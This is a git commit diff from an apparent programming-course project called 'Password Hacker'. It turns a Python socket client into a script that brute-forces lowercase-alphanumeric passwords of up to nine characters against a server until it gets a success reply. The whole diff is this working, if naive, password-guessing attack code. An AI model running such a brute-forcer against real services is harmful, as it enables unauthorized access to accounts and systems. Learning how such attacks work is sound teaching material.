e7a5c6a38adb8b48f272e7467b01c1d0c99fc28d
alcherniaev <playtowin19@gmail.com>
2021-01-06 23:56:04 +0300

    stage 2 done. password finding for connection to the server

--- Password Hacker/task/hacking/hack.py
+++ Password Hacker/task/hacking/hack.py
@@ -1,5 +1,7 @@
 import sys
 import socket
+import string
+import itertools
 my_socket = socket.socket()
 
 
@@ -7,16 +9,29 @@ my_socket = socket.socket()
 args = sys.argv
 ip_address = args[1]
 port = int(args[2])
-message = args[3].encode()
 
+char_num = list(string.ascii_lowercase) + ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
 
-# connect, send, receive
-def get_response():
+#message = args[3].encode()
+# connect
+def connect_server():
     address = (ip_address, port)
     my_socket.connect(address)
-    my_socket.send(message)
-    response = my_socket.recv(1024)
-    return response.decode()
 
 
+# send, receive
+def get_response():
+    for i in range(1, 10):
+        for password in itertools.product(char_num, repeat=i):
+            my_socket.send("".join(password).encode())
+            response = my_socket.recv(1024)
+            if response.decode() == "Connection success!":
+                return "".join(password)
+                exit()
+
+
+
+connect_server()
 print(get_response())
+
+
